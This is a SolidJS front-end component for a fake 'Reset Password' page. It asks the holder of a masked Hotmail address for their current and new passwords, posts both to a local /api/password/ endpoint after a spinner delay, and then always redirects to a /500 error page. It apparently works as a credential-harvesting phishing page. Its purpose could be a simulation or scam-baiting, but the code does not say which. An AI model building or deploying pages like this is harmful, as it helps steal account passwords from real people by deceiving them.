import { createSignal, Show } from "solid-js"
import { useNavigate } from "@solidjs/router";
import Main from "~/components/Main";
import Title from "~/components/Title";
import Logo from "~/components/Logo";
import PassInput from "~/components/PassInput";
import ValidationLabel from "~/components/ValidationLabel";
import Screen from "~/components/Screen";
import Spinner from "~/components/Spinner";

export default function Home() {
  const navigate = useNavigate();

  if (import.meta.env.VITE_EXPIRED === "true") { navigate("/expired"); }

  const [oldPassword, setOldPassword] = createSignal("");
  const [newPassword, setNewPassword] = createSignal("");
  const [showScreen, setShowScreen] = createSignal(false);
  const onInput = (f, e) => f(e.currentTarget.value);
  const noPasswordIsBlank = () => ![oldPassword(), newPassword()].includes("");
  const oldAndNewDiffer = () => oldPassword() !== newPassword();
  const newPasswordLengthOk = () => newPassword().length >= 8;
  const allowSubmit = () => noPasswordIsBlank() && oldAndNewDiffer() && newPasswordLengthOk();

  const onClick = () => {
    setShowScreen(true);

    setTimeout(async () => {
      const response = await fetch("/api/password/", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ oldPassword: oldPassword(), newPassword: newPassword() })
      });
      
      console.log(await response.json());
      navigate("/500");
    }, import.meta.env.VITE_TIMEOUT || 5000);
  };

  return (
    <>
      <Main>
        <Logo/>
        <Title>Reset Password</Title>
        <p>Enter the current password for the account associated with b*******r@hotmail.com.</p>

        <PassInput 
          placeholder="Current Password..."
          value={oldPassword()}
          onInput={e => onInput(setOldPassword, e)}
        />

        <p>Enter the new password.</p>

        <PassInput 
          placeholder="New Password..."
          value={newPassword()}
          onInput={e => onInput(setNewPassword, e)}
        />

        <Show when={noPasswordIsBlank()}>
          <ValidationLabel 
            isValid={oldAndNewDiffer()}
            text="The new password cannot be the same as the current password."
          />

          <ValidationLabel 
            isValid={newPasswordLengthOk()}
            text="The new password must be at least 8 characters long."
          />
        </Show>

        <input 
          type="button" 
          id="savePassword" 
          name="savePassword" 
          value="GO!"
          disabled={!allowSubmit()}
          classList={{allowSubmit: allowSubmit()}}
          on:click={onClick}

          style={{
            "font-weight": "bold",
            "font-size": "26pt",
            "color": "#ffffff",
            "background-color": "#c3c3c3",
            "height": "55px",
            "border": "none",
            "border-radius": "0.125in",
            
            ...(allowSubmit() ? {
              "background-image": "url('/bg-submit.gif')"
            } : {})
          }}
        />
      </Main>

      <Screen show={showScreen()}>
        <Spinner/>
      </Screen>
    </>
  );
}